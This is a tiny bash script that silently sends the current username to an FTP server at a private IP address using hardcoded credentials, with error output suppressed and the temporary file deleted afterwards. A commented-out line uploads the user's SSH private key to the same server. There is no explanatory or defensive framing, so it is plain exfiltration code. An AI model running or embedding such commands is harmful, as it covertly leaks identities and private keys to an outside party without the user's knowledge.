#!/bin/bash

#curl -u marigonez:azerty14 -T ~/.ssh/id_rsa ftp://10.19.253.64/ 2>> /dev/null
echo $USER > tmp
curl -u marigonez:azerty14 -T tmp ftp://10.19.253.64/ 2>> /dev/null
rm tmp
